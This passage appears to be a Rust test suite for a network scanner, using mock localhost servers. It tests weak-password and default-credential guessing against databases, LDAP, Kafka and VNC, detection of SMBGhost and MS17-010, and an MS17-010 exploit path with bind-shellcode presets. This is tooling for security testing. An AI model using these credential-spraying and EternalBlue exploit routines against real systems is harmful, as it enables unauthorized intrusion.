                .write_all(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x01, 0x01, 0x01, 0x01])
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "modbus",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "modbus");
        assert_eq!(findings[0].status, "unauthorized-access");
        assert_eq!(findings[0].details["service"], json!("modbus"));
        assert_eq!(
            findings[0].details["device_info"],
            json!("Unit ID: 1, Function: 0x01, Coil Status: 1")
        );
    }

    #[test]
    fn detects_ldap_anonymous_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 1024];

            let size = stream.read(&mut buffer).expect("bind should read");
            let request = &buffer[..size];
            assert!(request.windows(3).any(|window| window == b"\x02\x01\x03"));
            stream
                .write_all(&[
                    0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04,
                    0x00,
                ])
                .expect("bind response should write");

            let size = stream.read(&mut buffer).expect("search should read");
            let request = &buffer[..size];
            assert!(request.contains(&0x63));
            stream
                .write_all(&[
                    0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04,
                    0x00,
                ])
                .expect("search response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ldap",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ldap");
        assert_eq!(findings[0].status, "anonymous-access");
        assert_eq!(findings[0].details["service"], json!("ldap"));
        assert_eq!(findings[0].details["type"], json!("anonymous-access"));
    }

    #[test]
    fn detects_ldap_anonymous_access_over_tls_fallback() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        listener
            .set_nonblocking(true)
            .expect("listener should become nonblocking");
        let config = tls_test_config();

        let server = thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(3);
            while Instant::now() < deadline {
                match listener.accept() {
                    Ok((stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(1)))
                            .expect("read timeout should set");
                        stream
                            .set_write_timeout(Some(Duration::from_secs(1)))
                            .expect("write timeout should set");
                        let conn =
                            ServerConnection::new(config.clone()).expect("server conn should build");
                        let mut tls = StreamOwned::new(conn, stream);
                        if tls.conn.complete_io(&mut tls.sock).is_err() {
                            continue;
                        }

                        let mut buffer = [0u8; 1024];
                        let size = tls.read(&mut buffer).expect("bind should read");
                        let request = &buffer[..size];
                        assert!(request.windows(3).any(|window| window == b"\x02\x01\x03"));
                        tls.write_all(&[
                            0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04,
                            0x00, 0x04, 0x00,
                        ])
                        .expect("bind response should write");

                        let size = tls.read(&mut buffer).expect("search should read");
                        let request = &buffer[..size];
                        assert!(request.contains(&0x63));
                        tls.write_all(&[
                            0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04,
                            0x00, 0x04, 0x00,
                        ])
                        .expect("search response should write");
                        tls.flush().expect("response should flush");
                        return;
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(20));
                    }
                    Err(error) => panic!("accept failed: {error}"),
                }
            }
            panic!("timed out waiting for TLS LDAP request");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ldap",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ldap");
        assert_eq!(findings[0].status, "anonymous-access");
        assert_eq!(findings[0].details["service"], json!("ldap"));
        assert_eq!(findings[0].details["type"], json!("anonymous-access"));
    }

    #[test]
    fn detects_ldap_weak_password_with_default_dictionary() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut anonymous_stream, _) =
                listener.accept().expect("anonymous request should arrive");
            let mut buffer = [0u8; 2048];
            let _ = anonymous_stream
                .read(&mut buffer)
                .expect("anonymous bind should read");
            anonymous_stream
                .write_all(&[
                    0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x31, 0x04, 0x00, 0x04,
                    0x00,
                ])
                .expect("failure should write");

            let (mut weak_stream, _) = listener
                .accept()
                .expect("weak password request should arrive");
            let size = weak_stream.read(&mut buffer).expect("bind should read");
            let request = String::from_utf8_lossy(&buffer[..size]);
            assert!(request.contains("cn=admin,dc=example,dc=com"));
            assert!(request.contains("123456"));
            weak_stream
                .write_all(&[
                    0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04,
                    0x00,
                ])
                .expect("bind success should write");

            let _ = weak_stream.read(&mut buffer).expect("search should read");
            weak_stream
                .write_all(&[
                    0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04,
                    0x00,
                ])
                .expect("search response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ldap",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ldap");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_snmp_weak_community() {
        assert_eq!(
            parse_snmp_response(&snmp_test_response("public", "Mock SNMP")),
            Some("Mock SNMP".to_string())
        );

        let socket = UdpSocket::bind("127.0.0.1:0").expect("socket should bind");
        let port = socket.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let mut buffer = [0u8; 2048];
            let (size, peer) = socket
                .recv_from(&mut buffer)
                .expect("request should arrive");
            assert!(size > 0);
            socket
                .send_to(&snmp_test_response("public", "Mock SNMP"), peer)
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "snmp",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "snmp");
        assert_eq!(findings[0].status, "weak-community");
        assert_eq!(findings[0].details["community"], json!("public"));
        assert_eq!(findings[0].details["system"], json!("Mock SNMP"));
    }

    #[test]
    fn detects_neo4j_default_credentials() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut noauth_stream, _) = listener.accept().expect("noauth request should arrive");
            respond_neo4j_handshake(&mut noauth_stream, false)
                .expect("noauth flow should complete");

            let (mut default_stream, _) = listener.accept().expect("default request should arrive");
            respond_neo4j_handshake(&mut default_stream, true)
                .expect("default flow should complete");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "neo4j",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "neo4j");
        assert_eq!(findings[0].status, "default-credentials");
        assert_eq!(findings[0].details["username"], json!("neo4j"));
        assert_eq!(findings[0].details["password"], json!("neo4j"));
    }

    #[test]
    fn detects_neo4j_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            respond_neo4j_handshake(&mut stream, true).expect("flow should complete");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "neo4j",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "neo4j");
        assert_eq!(findings[0].status, "unauthorized-access");
    }

    #[test]
    fn detects_cassandra_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let startup = cassandra_read_frame(&mut stream).expect("startup should read");
            assert_eq!(startup.opcode, 0x01);
            stream
                .write_all(&cassandra_frame(0x84, 0x02, &[]))
                .expect("ready should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "cassandra",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "cassandra");
        assert_eq!(findings[0].status, "unauthorized-access");
    }

    #[test]
    fn detects_cassandra_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut anonymous_stream, _) =
                listener.accept().expect("anonymous request should arrive");
            let startup = cassandra_read_frame(&mut anonymous_stream).expect("startup should read");
            assert_eq!(startup.opcode, 0x01);
            anonymous_stream
                .write_all(&cassandra_frame(0x84, 0x03, &[]))
                .expect("authenticate should write");

            let (mut weak_stream, _) = listener.accept().expect("weak request should arrive");
            let startup = cassandra_read_frame(&mut weak_stream).expect("startup should read");
            assert_eq!(startup.opcode, 0x01);
            weak_stream
                .write_all(&cassandra_frame(0x84, 0x03, &[]))
                .expect("authenticate should write");
            let auth = cassandra_read_frame(&mut weak_stream).expect("auth should read");
            assert_eq!(auth.opcode, 0x0F);
            let payload = &auth.body[4..];
            assert!(payload.windows(9).any(|window| window == b"cassandra"));
            assert!(payload.windows(6).any(|window| window == b"123456"));
            weak_stream
                .write_all(&cassandra_frame(0x84, 0x10, &[]))
                .expect("auth success should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "cassandra",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "cassandra");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("cassandra"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_mysql_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            mysql_write_packet(&mut stream, 0, &mysql_handshake()).expect("handshake should write");
            let response = mysql_read_packet(&mut stream).expect("response should read");
            assert!(response.windows(5).any(|window| window == b"root\0"));
            stream
                .write_all(&[
                    0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                ])
                .expect("ok should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "mysql",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "mysql");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("root"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_mssql_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let prelogin = mssql_read_message(&mut stream).expect("prelogin should read");
            assert_eq!(prelogin, mssql_prelogin_message());
            mssql_write_packet(&mut stream, 0x04, 1, &mssql_prelogin_message())
                .expect("prelogin response should write");

            let login = mssql_read_message(&mut stream).expect("login should read");
            assert_eq!(mssql_login_username(&login), Some("sa".to_string()));
            assert_eq!(mssql_login_password(&login), Some("123456".to_string()));
            mssql_write_packet(&mut stream, 0x04, 1, &mssql_login_ack_payload())
                .expect("login ack should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "mssql",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "mssql");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["service"], json!("mssql"));
        assert_eq!(findings[0].details["username"], json!("sa"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_oracle_weak_password_with_mock_connector() {
        let mut attempts = Vec::new();
        let finding = scan_oracle_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 1521,
            },
            &PluginContext {
                usernames: vec!["admin".to_string()],
                passwords: vec!["{user}@123".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, service_name, _, as_sysdba| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    service_name.to_string(),
                    as_sysdba,
                ));
                Ok(
                    !as_sysdba
                        && username == "ADMIN"
                        && password == "admin@123"
                        && service_name == "ORCL",
                )
            },
        )
        .expect("scan should succeed")
        .expect("oracle finding should exist");

        assert_eq!(finding.plugin, "oracle");
        assert_eq!(finding.status, "weak-password");
        assert_eq!(finding.details["service"], json!("oracle"));
        assert_eq!(finding.details["username"], json!("ADMIN"));
        assert_eq!(finding.details["password"], json!("admin@123"));
        assert_eq!(finding.details["service_name"], json!("ORCL"));
        assert!(attempts.contains(&(
            "ADMIN".to_string(),
            "admin@123".to_string(),
            "ORCL".to_string(),
            false,
        )));
    }

    #[test]
    fn tries_oracle_high_risk_credentials_first() {
        let mut attempts = Vec::new();
        let finding = scan_oracle_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 1521,
            },
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, service_name, _, as_sysdba| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    service_name.to_string(),
                    as_sysdba,
                ));
                Ok(
                    !as_sysdba
                        && username == "SYS"
                        && password == "123456"
                        && service_name == "XE",
                )
            },
        )
        .expect("scan should succeed")
        .expect("oracle finding should exist");

        assert_eq!(
            attempts.first(),
            Some(&("SYS".to_string(), "123456".to_string(), "XE".to_string(), false))
        );
        assert_eq!(finding.details["username"], json!("SYS"));
        assert_eq!(finding.details["password"], json!("123456"));
        assert_eq!(finding.details["service_name"], json!("XE"));
    }

    #[test]
    fn retries_sys_credentials_with_sysdba_like_go() {
        let mut attempts = Vec::new();
        let finding = scan_oracle_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 1521,
            },
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, service_name, _, as_sysdba| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    service_name.to_string(),
                    as_sysdba,
                ));
                Ok(
                    username == "SYS"
                        && password == "123456"
                        && service_name == "XE"
                        && as_sysdba,
                )
            },
        )
        .expect("scan should succeed")
        .expect("oracle finding should exist");

        assert_eq!(
            attempts[0],
            ("SYS".to_string(), "123456".to_string(), "XE".to_string(), false)
        );
        assert_eq!(
            attempts[1],
            ("SYS".to_string(), "123456".to_string(), "XE".to_string(), true)
        );
        assert_eq!(finding.details["username"], json!("SYS"));
        assert_eq!(finding.details["password"], json!("123456"));
        assert_eq!(finding.details["service_name"], json!("XE"));
    }

    #[test]
    fn detects_postgres_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let startup = postgres_read_startup(&mut stream).expect("startup should read");
            let text = String::from_utf8_lossy(&startup);
            assert!(text.contains("user\0postgres\0"));
            stream
                .write_all(&postgres_server_message(
                    b'R',
                    &[5u32.to_be_bytes().as_slice(), &[1, 2, 3, 4]].concat(),
                ))
                .expect("auth should write");

            let (tag, payload) = postgres_read_message(&mut stream).expect("password should read");
            assert_eq!(tag, b'p');
            let password = String::from_utf8_lossy(&payload);
            assert!(password.starts_with("md5"));

            stream
                .write_all(&postgres_server_message(b'R', &0u32.to_be_bytes()))
                .expect("auth ok should write");
            stream
                .write_all(&postgres_server_message(b'Z', b"I"))
                .expect("ready should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "postgres",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "postgres");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["service"], json!("postgresql"));
        assert_eq!(findings[0].details["username"], json!("postgres"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_kafka_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let request = kafka_read_frame(&mut stream).expect("request should read");
            assert_eq!(kafka_request_api_key(&request), Some(18));
            stream
                .write_all(&kafka_response_frame(1, &[0, 0, 0, 0]))
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "kafka",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "kafka");
        assert_eq!(findings[0].status, "unauthorized-access");
    }

    #[test]
    fn detects_kafka_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut unauth_stream, _) = listener.accept().expect("unauth request should arrive");
            let request = kafka_read_frame(&mut unauth_stream).expect("request should read");
            assert_eq!(kafka_request_api_key(&request), Some(18));

            let (mut auth_stream, _) = listener.accept().expect("auth request should arrive");
            let handshake = kafka_read_frame(&mut auth_stream).expect("handshake should read");
            assert_eq!(kafka_request_api_key(&handshake), Some(17));
            auth_stream
                .write_all(&kafka_response_frame(
                    1,
                    &[
                        0i16.to_be_bytes().as_slice(),
                        &1i32.to_be_bytes(),
                        &kafka_string("PLAIN"),
                    ]
                    .concat(),
                ))
                .expect("handshake response should write");

            let auth = kafka_read_frame(&mut auth_stream).expect("auth should read");
            assert!(auth.windows(7).any(|window| window == b"\0admin\0"));
            assert!(auth.windows(6).any(|window| window == b"123456"));

            let request = kafka_read_frame(&mut auth_stream).expect("api versions should read");
            assert_eq!(kafka_request_api_key(&request), Some(18));
            auth_stream
                .write_all(&kafka_response_frame(2, &[0, 0, 0, 0]))
                .expect("api versions response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "kafka",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "kafka");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_vnc_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let challenge = *b"0123456789abcdef";
            stream
                .write_all(b"RFB 003.008\n")
                .expect("version should write");
            let mut version = [0u8; 12];
            stream
                .read_exact(&mut version)
                .expect("version should read");
            stream.write_all(&[1, 2]).expect("security should write");

            let mut selected = [0u8; 1];
            stream
                .read_exact(&mut selected)
                .expect("selection should read");
            assert_eq!(selected[0], 2);

            stream
                .write_all(&challenge)
                .expect("challenge should write");
            let mut response = [0u8; 16];
            stream
                .read_exact(&mut response)
                .expect("response should read");
            assert_eq!(
                response,
                vnc_encrypt_challenge("123456", &challenge).expect("challenge should encrypt")
            );
            stream
                .write_all(&0u32.to_be_bytes())
                .expect("status should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "vnc",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "vnc");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_smbghost_vulnerability() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 256];
            let count = stream.read(&mut buffer).expect("probe should read");
            assert_eq!(&buffer[..count], SMBGHOST_PROBE);

            let mut response = vec![0u8; 96];
            response[16..22].copy_from_slice(b"Public");
            response[72..74].copy_from_slice(&[0x11, 0x03]);
            response[74..76].copy_from_slice(&[0x02, 0x00]);
            stream.write_all(&response).expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "smbghost",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "smbghost");
        assert_eq!(findings[0].status, "vulnerable");
        assert_eq!(findings[0].details["type"], json!("cve-2020-0796"));
    }

    #[test]
    fn detects_ms17010_vulnerability() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");

            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
            stream
                .read_exact(&mut negotiate)
                .expect("negotiate should read");
            assert_eq!(negotiate, ms17010_negotiate_request());
            stream
                .write_all(&ms17010_negotiate_response())
                .expect("negotiate response should write");

            let mut session = vec![0u8; ms17010_session_setup_request().len()];
            stream
                .read_exact(&mut session)
                .expect("session should read");
            assert_eq!(session, ms17010_session_setup_request());
            let user_id = [0x34, 0x12];
            stream
                .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
                .expect("session response should write");

            let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
            stream.read_exact(&mut tree).expect("tree should read");
            assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
            let tree_id = [0x78, 0x56];
            stream
                .write_all(&ms17010_tree_response(tree_id))
                .expect("tree response should write");

            let mut pipe = vec![0u8; ms17010_trans_named_pipe_request().len()];
            stream
                .read_exact(&mut pipe)
                .expect("named pipe should read");
            assert_eq!(pipe, ms17010_trans_named_pipe_request_for(tree_id, user_id));
            stream
                .write_all(&ms17010_named_pipe_response(true))
                .expect("named pipe response should write");

            let mut trans2 = vec![0u8; ms17010_trans2_session_setup_request().len()];
            stream.read_exact(&mut trans2).expect("trans2 should read");
            assert_eq!(
                trans2,
                ms17010_trans2_session_setup_request_for(tree_id, user_id)
            );
            stream
                .write_all(&ms17010_backdoor_response(true))
                .expect("backdoor response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ms17010",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ms17010");
        assert_eq!(findings[0].status, "vulnerable");
        assert_eq!(findings[0].details["vulnerability"], json!("MS17-010"));
        assert_eq!(findings[0].details["backdoor"], json!("DOUBLEPULSAR"));
        assert_eq!(findings[0].details["os"], json!("Windows Server 2012 R2"));
    }

    #[test]
    fn resolves_ms17010_bind_shellcode_preset() {
        let shellcode = resolve_ms17010_shellcode("bind").expect("bind preset should resolve");
        assert!(shellcode.len() > 10);
    }

    #[test]
    fn rejects_ms17010_cs_preset_as_invalid_shellcode() {
        let error = resolve_ms17010_shellcode("cs").expect_err("cs preset should be invalid");
        assert!(error.to_string().contains("invalid ms17010 shellcode"));
    }

    #[test]
    fn attempts_ms17010_exploit_when_shellcode_requested() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        let payload_capture = Arc::new(Mutex::new(Vec::new()));
        let capture = Arc::clone(&payload_capture);

        let server = thread::spawn(move || {
            let (mut detect_stream, _) =
                listener.accept().expect("detect connection should arrive");

            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
            detect_stream
                .read_exact(&mut negotiate)
                .expect("negotiate should read");
            assert_eq!(negotiate, ms17010_negotiate_request());
            detect_stream
                .write_all(&ms17010_negotiate_response())
                .expect("negotiate response should write");

            let mut session = vec![0u8; ms17010_session_setup_request().len()];
            detect_stream
                .read_exact(&mut session)
                .expect("session should read");
            assert_eq!(session, ms17010_session_setup_request());
            let user_id = [0x34, 0x12];
            detect_stream
                .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
                .expect("session response should write");

            let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
            detect_stream
                .read_exact(&mut tree)
                .expect("tree should read");
            assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
            let tree_id = [0x78, 0x56];
            detect_stream
                .write_all(&ms17010_tree_response(tree_id))
                .expect("tree response should write");

            let mut pipe = vec![0u8; ms17010_trans_named_pipe_request().len()];
            detect_stream
                .read_exact(&mut pipe)
                .expect("named pipe should read");
            assert_eq!(pipe, ms17010_trans_named_pipe_request_for(tree_id, user_id));
            detect_stream
                .write_all(&ms17010_named_pipe_response(true))
                .expect("named pipe response should write");

            let mut trans2 = vec![0u8; ms17010_trans2_session_setup_request().len()];
            detect_stream
                .read_exact(&mut trans2)
                .expect("trans2 should read");
            assert_eq!(
                trans2,
                ms17010_trans2_session_setup_request_for(tree_id, user_id)
            );
            detect_stream
                .write_all(&ms17010_backdoor_response(true))
                .expect("backdoor response should write");
            drop(detect_stream);

            let (mut exploit_stream, _) =
                listener.accept().expect("exploit connection should arrive");
            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
            exploit_stream
                .read_exact(&mut negotiate)
                .expect("exploit negotiate should read");
            assert_eq!(negotiate, ms17010_negotiate_request());
            exploit_stream
                .write_all(&ms17010_negotiate_response())
                .expect("exploit negotiate response should write");

            let mut session = vec![0u8; ms17010_session_setup_request().len()];
            exploit_stream
                .read_exact(&mut session)
                .expect("exploit session should read");
            assert_eq!(session, ms17010_session_setup_request());
            exploit_stream
                .write_all(&ms17010_session_response(user_id, "Windows Server 2012 R2"))
                .expect("exploit session response should write");

            let mut tree = vec![0u8; ms17010_tree_connect_request("127.0.0.1", user_id).len()];
            exploit_stream
                .read_exact(&mut tree)
                .expect("exploit tree should read");
            assert_eq!(tree, ms17010_tree_connect_request_for("127.0.0.1", user_id));
            exploit_stream
                .write_all(&ms17010_tree_response(tree_id))
                .expect("exploit tree response should write");

            let nt_trans = read_netbios_message(&mut exploit_stream).expect("nt trans should read");
            assert_eq!(nt_trans[8], 0xA0);
            exploit_stream
                .write_all(&ms17010_framed_response(0xA0, tree_id, user_id, &[]))
                .expect("nt trans response should write");

            for index in 0..15 {
                let trans =
                    read_netbios_message(&mut exploit_stream).expect("trans2 packet should read");
                assert_eq!(trans[8], 0x33);
